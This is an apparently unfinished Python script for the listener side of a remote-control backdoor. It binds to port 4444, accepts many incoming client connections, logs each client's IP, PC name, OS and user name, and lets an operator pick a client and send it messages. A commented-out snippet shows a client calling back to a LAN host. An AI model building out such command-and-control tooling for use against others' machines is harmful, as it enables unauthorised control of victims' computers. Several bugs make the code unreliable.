import socket
import os
import time
import threading
import sys
from queue import Queue   # like list based on FIFO alg.
# standard module for communication between interfaces based on port

intThreads = 2
arrJobs = [1, 2]
queue = Queue()

arrAddresses = []
arrConnections = []

# TODO refaktor on ipnut
strHost = "192.168.0.129"
intPort = 4444

# maximum characters which i can receive
intBuff = 1024

# anonymus fn


def decode_utf(data): return data.decode("utf-8")


def remove_quotes(string): return string.replace("\"", "")


def center(string, title): return f"{{:^{len(string)}}}".format(title)

# function to send data


def send(data): return conn.send(data)

# function to receive data


def recv(buffer): return conn.recv(buffer)


def recvall(buffer):
    bytData = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart

        if len(bytData) == buffer:
            return bytData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        # SOL_SOCKET part of IPV4
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    except socket.error() as strError:
        print("Error creating socket " + str(strError))


def socket_bind():
    global objSocket
    try:
        print("Listening on port: " + str(intPort))
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)

    except socket.error() as strError:
        print("Error binding socket " + str(strError))
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            arrConnections.append(conn)
            client_info = decode_utf(conn.recv(intBuff)).split("',")

            address += client_info[0], client_info[1], client_info[2]

            arrAddresses.append(address)
            # address[0] ip adress, address[2] pc info
            print(
                "\n" + "Connection has been established : {0} ({1})".format(address[0], address[2]))

        except socket.error:
            print("Error accepting connections!")
            continue


def menu_help():
    print("\n " + " --help")
    print("--l List all our connections")


def close():
    global arrConnections, arrAddresses

    if (arrAddresses) == 0:
        return

    for int_counter, conn in enumerate(arrConnections):
        conn.send(str.encode("exit"))
        conn.close()

    del arrConnections
    arrConnections = []
    del arrAddresses
    arrAddresses = []


#  need refactor formating
def list_connections():
    if len(arrConnections) > 0:
        str_client = ""

        for int_counter, conn in enumerate(arrConnections):
            str_client += str(int_counter) + 4 * " " + str(arrAddresses[int_counter][0]) + 4 * " " + str(
                arrAddresses[int_counter][1]) + 4 * " " + str(arrAddresses[int_counter][2]) + 4 * " " + str(arrAddresses[int_counter][3]) + "\n"

        print("\n" + "ID" + 3 * " " + center(str(arrAddresses[0][0]), "IP") + 4 * " " + center(str(arrAddresses[0][1]), "Port") + 4 * " " + center(
            str(arrAddresses[0][2]), "PC name") + 4 * " " + center(str(arrAddresses[0][3]), "OS") + "\n" + str_client, end="")

    else:
        print("No connections.")


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]

    except:
        print("Invalid choice! Try again.")
        return
    else:
        # [IP, PC Name, OS, user name]
        arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), str(
            arrAddresses[connection_id][3]), str(arrAddresses[connection_id][4])

        if blnGetResponse == "True":
            print("You are connected to " + arrInfo[0] + " ....\n")


def send_commands():
    while True:
        str_choice = input("\nType selection: ")

        if str_choice[:3] == "--m" and len(str_choice) > 3:
            str_msg = "msg " + str_choice[4:]
            send(str.encode(str_msg))


def main_menu():
    while True:
        str_choice = input("\n " + " >> ")

        if str_choice == "--l":
            list_connections()

        elif str_choice[:3] == "--i" and len(str_choice) > 3:
            conn = select_connection(str_choice[4:], "True")
            if conn is not None:
                send_commands()
        elif str_choice == "--x":
            close()
            break

        else:
            print("Invalid choice, try again\n")
            menu_help()


# multithreading - support different proccess running together
def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()

    queue.join()


def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()

        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break

        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThreads in arrJobs:
        queue.put(intThreads)
    queue.join()



create_threads()
create_jobs()

# connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# #AF_INET = specify type address family of IPV4
# #SOCK_STREAM = TCP connection

# connection.connect(("192.168.0.202", 4444))
# #connection established = ip of the server, port

# message = "Succesfully connected."
# connection.sendto(message.encode(), ("192.168.0.202", 4444))
# #message which will be send

# receive_data = connection.recv(1024)
# print(receive_data)

# connection.close()
